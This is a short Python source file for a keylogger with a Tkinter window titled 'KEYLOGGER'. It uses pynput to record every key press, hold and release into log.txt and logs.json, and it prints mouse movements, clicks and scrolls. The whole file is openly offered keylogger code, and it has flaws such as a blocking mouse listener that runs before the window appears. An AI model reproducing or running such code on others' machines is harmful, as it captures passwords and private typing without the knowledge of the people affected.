from pynput import keyboard
import json
import tkinter as tk
from tkinter import *

from pynput import mouse

r=tk.Tk()
r.geometry("300x300")
r.title("KEYLOGGER")
r.configure(bg='grey')

k_list=[]
x=False
k_strokes=""

def update_txt_file(key):
    with open('log.txt','w+') as k_stroke:
              k_stroke.write(key)
              
def update_json_file(k_list):
    with open('logs.json','w+') as k_log:
        k_list_bytes=json.dumps(k_list).encode()
        k_log.write(str(k_list_bytes))

def on_press(key):
    global x,k_list
    if x==False:
        k_list.append(
            {'Pressed':f'{key}'}
            )
        x=True
    if x==True:
        k_list.append(
            {'Held':f'{key}'}
            )
    update_json_file(k_list)
        

def on_release(key):
    global x,k_list,k_strokes
    k_list.append(
        {'Released':f'{key}'}
        )
    if x==True:
        x=False
    update_json_file(k_list)

    k_strokes=k_strokes+str(key)
    update_txt_file(str(k_strokes))

def button_action():
    
    print("[+] Running keylogger Successfully!\n[!] Saving the key logs in 'logs.json' ")

    with keyboard.Listener(on_press=on_press,on_release=on_release) as Listener:
        Listener.join()
        
def button_e():
    exit()

def on_move(x, y):
    print('Pointer moved to {0}'.format(
        (x, y)))

def on_click(x, y, button, pressed):
    print('{0} at {1}'.format(
        'Pressed' if pressed else 'Released',
        (x, y)))
    if not pressed:
        return False

def on_scroll(x, y, dx, dy):
    print('Scrolled {0} at {1}'.format(
        'down' if dy < 0 else 'up',
        (x, y)))

with mouse.Listener(
        on_move=on_move,
        on_click=on_click,
        on_scroll=on_scroll) as listener:
    listener.join()

listener = mouse.Listener(
    on_move=on_move,
    on_click=on_click,
    on_scroll=on_scroll)
listener.start()


emp=Label(r,text=" ").grid(row=0,column=0)
emp=Label(r,text=" ").grid(row=1,column=0)
emp=Label(r,text=" ").grid(row=2,column=0)
emp=Label(r,text="Keylogger",font='Verdana 15 bold').grid(row=3,column=4)
Button(r,text="Start Keylogger",command=button_action).grid(row=4,column=4)
Button(r,text="Exit Keylogger",command=button_e).grid(row=5,column=4)
r.mainloop()

